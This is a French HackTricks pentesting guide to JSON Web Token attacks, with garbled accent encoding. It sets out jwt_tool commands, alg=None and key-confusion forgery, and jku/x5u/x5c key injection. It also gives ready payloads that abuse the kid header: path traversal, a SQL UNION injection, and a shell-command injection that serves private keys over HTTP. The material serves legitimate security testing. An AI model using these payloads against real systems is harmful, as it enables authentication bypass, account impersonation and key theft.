# Vuln√©rabilit√©s JWT (Json Web Tokens)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'impiratable - **nous recrutons !** (_ma√Ætrise du polonais √©crit et parl√© requise_).

{% embed url="https://www.stmcyber.com/careers" %}

**Une partie de ce post est bas√©e sur l'excellent post :** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Auteur de l'outil g√©nial pour le pentest des JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Gains Rapides**

Ex√©cutez [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) en mode `Tous les tests !` et attendez les lignes vertes
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Si vous avez de la chance, l'outil trouvera un cas o√π l'application web ne v√©rifie pas correctement le JWT :

![](<../.gitbook/assets/image (935).png>)

Ensuite, vous pouvez rechercher la requ√™te dans votre proxy ou extraire le JWT utilis√© pour cette requ√™te en utilisant l'outil jwt\_ :
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
Vous pouvez √©galement utiliser l'[extension Burp SignSaboteur](https://github.com/d0ge/sign-saboteur) pour lancer des attaques JWT depuis Burp.

### Manipuler les donn√©es sans rien modifier

Vous pouvez simplement manipuler les donn√©es en laissant la signature telle quelle et v√©rifier si le serveur v√©rifie la signature. Essayez de changer votre nom d'utilisateur en "admin", par exemple.

#### **Le jeton est-il v√©rifi√© ?**

Pour v√©rifier si la signature d'un JWT est v√©rifi√©e :

* Un message d'erreur sugg√®re une v√©rification en cours ; les d√©tails sensibles dans les erreurs verbeuses doivent √™tre examin√©s.
* Un changement dans la page renvoy√©e indique une v√©rification.
* Aucun changement ne sugg√®re aucune v√©rification ; c'est le moment d'exp√©rimenter en alt√©rant les revendications de la charge utile.

### Origine

Il est important de d√©terminer si le jeton a √©t√© g√©n√©r√© c√¥t√© serveur ou c√¥t√© client en examinant l'historique des requ√™tes du proxy.

* Les jetons d'abord vus c√¥t√© client sugg√®rent que la cl√© pourrait √™tre expos√©e au code c√¥t√© client, n√©cessitant une enqu√™te plus approfondie.
* Les jetons d'origine c√¥t√© serveur indiquent un processus s√©curis√©.

### Dur√©e

V√©rifiez si le jeton dure plus de 24h... peut-√™tre n'expire-t-il jamais. S'il y a un champ "exp", v√©rifiez si le serveur le g√®re correctement.

### Force brute du secret HMAC

[Voir cette page.](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modifier l'algorithme en None

D√©finissez l'algorithme utilis√© comme "None" et supprimez la partie signature.

Utilisez l'extension Burp appel√©e "JSON Web Token" pour tester cette vuln√©rabilit√© et modifier diff√©rentes valeurs √† l'int√©rieur du JWT (envoyez la requ√™te √† Repeater et dans l'onglet "JSON Web Token", vous pouvez modifier les valeurs du jeton. Vous pouvez √©galement choisir de mettre la valeur du champ "Alg" √† "None").

### Changer l'algorithme de RS256(asym√©trique) √† HS256(sym√©trique) (CVE-2016-5431/CVE-2016-10555)

L'algorithme HS256 utilise la cl√© secr√®te pour signer et v√©rifier chaque message.\
L'algorithme RS256 utilise la cl√© priv√©e pour signer le message et utilise la cl√© publique pour l'authentification.

Si vous changez l'algorithme de RS256 √† HS256, le code c√¥t√© serveur utilise la cl√© publique comme cl√© secr√®te, puis utilise l'algorithme HS256 pour v√©rifier la signature.

Ensuite, en utilisant la cl√© publique et en changeant RS256 en HS256, nous pourrions cr√©er une signature valide. Vous pouvez r√©cup√©rer le certificat du serveur web en ex√©cutant ceci :
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nouvelle cl√© publique dans l'en-t√™te

Un attaquant int√®gre une nouvelle cl√© dans l'en-t√™te du jeton et le serveur utilise cette nouvelle cl√© pour v√©rifier la signature (CVE-2018-0114).

Cela peut √™tre fait avec l'extension Burp "JSON Web Tokens".\
(Envoyez la requ√™te au Repeater, dans l'onglet JSON Web Token s√©lectionnez "CVE-2018-0114" et envoyez la requ√™te).

### Contrefa√ßon de JWKS

Les instructions d√©taillent une m√©thode pour √©valuer la s√©curit√© des jetons JWT, en particulier ceux utilisant une revendication d'en-t√™te "jku". Cette revendication devrait √™tre li√©e √† un fichier JWKS (JSON Web Key Set) contenant la cl√© publique n√©cessaire √† la v√©rification du jeton.

* **√âvaluation des jetons avec l'en-t√™te "jku"**:
* V√©rifiez l'URL de la revendication "jku" pour vous assurer qu'elle m√®ne au fichier JWKS appropri√©.
* Modifiez la valeur "jku" du jeton pour diriger vers un service web contr√¥l√©, permettant l'observation du trafic.
* **Surveillance de l'interaction HTTP**:
* Observer les requ√™tes HTTP vers votre URL sp√©cifi√©e indique les tentatives du serveur pour r√©cup√©rer les cl√©s √† partir de votre lien fourni.
* Lors de l'utilisation de `jwt_tool` pour ce processus, il est crucial de mettre √† jour le fichier `jwtconf.ini` avec l'emplacement de votre JWKS personnel pour faciliter les tests.
* **Commande pour `jwt_tool`**:
*   Ex√©cutez la commande suivante pour simuler le sc√©nario avec `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Aper√ßu des probl√®mes de Kid

Une revendication d'en-t√™te facultative appel√©e `kid` est utilis√©e pour identifier une cl√© sp√©cifique, ce qui devient particuli√®rement vital dans les environnements o√π plusieurs cl√©s existent pour la v√©rification de la signature du jeton. Cette revendication aide √† s√©lectionner la cl√© appropri√©e pour v√©rifier la signature d'un jeton.

#### R√©v√©lation de la cl√© via "kid"

Lorsque la revendication `kid` est pr√©sente dans l'en-t√™te, il est conseill√© de rechercher le r√©pertoire web pour le fichier correspondant ou ses variations. Par exemple, si `"kid":"key/12345"` est sp√©cifi√©, les fichiers _/key/12345_ et _/key/12345.pem_ devraient √™tre recherch√©s dans la racine du site web.

#### Travers√©e de chemin avec "kid"

La revendication `kid` peut √©galement √™tre exploit√©e pour naviguer √† travers le syst√®me de fichiers, permettant potentiellement la s√©lection d'un fichier arbitraire. Il est possible de tester la connectivit√© ou d'ex√©cuter des attaques de falsification de requ√™te c√¥t√© serveur (SSRF) en modifiant la valeur `kid` pour cibler des fichiers ou des services sp√©cifiques. La manipulation du JWT pour changer la valeur `kid` tout en conservant la signature d'origine peut √™tre r√©alis√©e en utilisant le drapeau `-T` dans jwt\_tool, comme d√©montr√© ci-dessous:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
En ciblant des fichiers avec un contenu pr√©visible, il est possible de falsifier un JWT valide. Par exemple, le fichier `/proc/sys/kernel/randomize_va_space` dans les syst√®mes Linux, connu pour contenir la valeur **2**, peut √™tre utilis√© dans le param√®tre `kid` avec **2** comme mot de passe sym√©trique pour la g√©n√©ration de JWT.

#### Injection SQL via "kid"

Si le contenu de la revendication `kid` est utilis√© pour r√©cup√©rer un mot de passe depuis une base de donn√©es, une injection SQL pourrait √™tre facilit√©e en modifiant la charge utile `kid`. Un exemple de charge utile qui utilise une injection SQL pour modifier le processus de signature JWT est :

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Cette modification force l'utilisation d'une cl√© secr√®te connue, `ATTACKER`, pour la signature JWT.

#### Injection OS via "kid"

Un sc√©nario o√π le param√®tre `kid` sp√©cifie un chemin de fichier utilis√© dans un contexte d'ex√©cution de commande pourrait entra√Æner des vuln√©rabilit√©s d'Ex√©cution de Code √† Distance (RCE). En injectant des commandes dans le param√®tre `kid`, il est possible d'exposer des cl√©s priv√©es. Un exemple de charge utile pour atteindre une RCE et l'exposition de cl√©s est :

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u et jku

#### jku

jku signifie **URL de jeu de cl√©s JWK**.\
Si le jeton utilise une revendication d'en-t√™te "**jku**", **v√©rifiez l'URL fournie**. Cela devrait pointer vers une URL contenant le fichier JWKS qui d√©tient la cl√© publique pour v√©rifier le jeton. Manipulez le jeton pour pointer la valeur jku vers un service web dont vous pouvez surveiller le trafic.

Tout d'abord, vous devez cr√©er un nouveau certificat avec de nouvelles cl√©s priv√©es et publiques.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Ensuite, vous pouvez utiliser par exemple [**jwt.io**](https://jwt.io) pour cr√©er le nouveau JWT avec les **cl√©s publiques et priv√©es cr√©√©es et en pointant le param√®tre jku vers le certificat cr√©√©.** Pour cr√©er un certificat jku valide, vous pouvez t√©l√©charger l'original et modifier les param√®tres n√©cessaires.

Vous pouvez obtenir les param√®tres "e" et "n" √† partir d'un certificat public en utilisant :
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. Un URI pointant vers un ensemble de certificats publics X.509 (un standard de format de certificat) encod√©s sous forme PEM. Le premier certificat de l'ensemble doit √™tre celui utilis√© pour signer ce JWT. Les certificats suivants signent chacun le pr√©c√©dent, compl√©tant ainsi la cha√Æne de certificats. X.509 est d√©fini dans la RFC 52807. Une s√©curit√© de transport est requise pour transf√©rer les certificats.

Essayez de **modifier cet en-t√™te pour qu'il pointe vers une URL sous votre contr√¥le** et v√©rifiez si une requ√™te est re√ßue. Dans ce cas, vous **pourriez alt√©rer le JWT**.

Pour falsifier un nouveau jeton en utilisant un certificat contr√¥l√© par vous, vous devez cr√©er le certificat et extraire les cl√©s publique et priv√©e :
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Ensuite, vous pouvez utiliser par exemple [**jwt.io**](https://jwt.io) pour cr√©er le nouveau JWT avec les **cl√©s publiques et priv√©es cr√©√©es et en pointant le param√®tre x5u vers le certificat .crt cr√©√©**.

![](<../.gitbook/assets/image (956).png>)

Vous pouvez √©galement abuser de ces deux vuln√©rabilit√©s **pour les SSRFs**.

#### x5c

Ce param√®tre peut contenir le **certificat en base64** :

![](<../.gitbook/assets/image (1119).png>)

Si l'attaquant **g√©n√®re un certificat auto-sign√©** et cr√©e un jeton falsifi√© en utilisant la cl√© priv√©e correspondante et remplace la valeur du param√®tre "x5c" par le certificat nouvellement g√©n√©r√© et modifie les autres param√®tres, √† savoir n, e et x5t, alors essentiellement le jeton falsifi√© serait accept√© par le serveur.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Cl√© publique int√©gr√©e (CVE-2018-0114)

Si le JWT a int√©gr√© une cl√© publique comme dans le sc√©nario suivant:

![](<../.gitbook/assets/image (624).png>)

En utilisant le script nodejs suivant, il est possible de g√©n√©rer une cl√© publique √† partir de ces donn√©es:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Il est possible de g√©n√©rer une nouvelle cl√© priv√©e/publique, d'incorporer la nouvelle cl√© publique √† l'int√©rieur du jeton et de l'utiliser pour g√©n√©rer une nouvelle signature :
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Vous pouvez obtenir les "n" et "e" en utilisant ce script nodejs :
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### ES256: R√©v√©ler la cl√© priv√©e avec le m√™me nonce

Si certaines applications utilisent ES256 et utilisent le m√™me nonce pour g√©n√©rer deux JWT, la cl√© priv√©e peut √™tre r√©cup√©r√©e.

Voici un exemple: [ECDSA: R√©v√©ler la cl√© priv√©e, si le m√™me nonce est utilis√© (avec SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

La revendication JTI (JWT ID) fournit un identifiant unique pour un jeton JWT. Il peut √™tre utilis√© pour emp√™cher le jeton d'√™tre rejou√©.\
Cependant, imaginez une situation o√π la longueur maximale de l'ID est de 4 (0001-9999). Les requ√™tes 0001 et 10001 vont utiliser le m√™me ID. Donc, si le backend incr√©mente l'ID √† chaque requ√™te, vous pourriez abuser de cela pour **rejouer une requ√™te** (n√©cessitant d'envoyer 10000 requ√™tes entre chaque rejou r√©ussi).

### R√©clamations enregistr√©es JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Autres attaques

**Attaques de relais entre services**

Il a √©t√© observ√© que certaines applications web s'appuient sur un service JWT de confiance pour la g√©n√©ration et la gestion de leurs jetons. Des cas ont √©t√© enregistr√©s o√π un jeton, g√©n√©r√© pour un client par le service JWT, a √©t√© accept√© par un autre client du m√™me service JWT. Si l'√©mission ou le renouvellement d'un JWT via un service tiers est observ√©, la possibilit√© de s'inscrire √† un compte sur un autre client de ce service en utilisant le m√™me nom d'utilisateur/email devrait √™tre investigu√©e. Une tentative devrait ensuite √™tre faite pour rejouer le jeton obtenu dans une requ√™te vers la cible pour voir s'il est accept√©.

* Un probl√®me critique peut √™tre indiqu√© par l'acceptation de votre jeton, permettant potentiellement le spoofing du compte de n'importe quel utilisateur. Cependant, il convient de noter qu'une autorisation pour des tests plus larges pourrait √™tre requise si vous vous inscrivez sur une application tierce, car cela pourrait entrer dans une zone grise l√©gale.

**V√©rification de l'expiration des jetons**

L'expiration du jeton est v√©rifi√©e en utilisant la revendication Payload "exp". √âtant donn√© que les JWT sont souvent utilis√©s sans information de session, une manipulation prudente est requise. Dans de nombreux cas, capturer et rejouer le JWT d'un autre utilisateur pourrait permettre l'usurpation de cet utilisateur. Le RFC JWT recommande de mitiger les attaques de rejou en utilisant la revendication "exp" pour d√©finir un temps d'expiration pour le jeton. De plus, la mise en ≈ìuvre de v√©rifications pertinentes par l'application pour garantir le traitement de cette valeur et le rejet des jetons expir√©s est crucial. Si le jeton inclut une revendication "exp" et que les limites de temps de test le permettent, il est conseill√© de stocker le jeton et de le rejouer apr√®s que le temps d'expiration soit √©coul√©. Le contenu du jeton, y compris l'analyse de l'horodatage et la v√©rification de l'expiration (horodatage en UTC), peut √™tre lu en utilisant le drapeau -R de l'outil jwt\_tool.

* Un risque de s√©curit√© peut √™tre pr√©sent si l'application valide toujours le jeton, car cela pourrait impliquer que le jeton ne pourrait jamais expirer.

### Outils

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'impossible - **nous recrutons !** (_ma√Ætrise du polonais √©crit et parl√© requis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
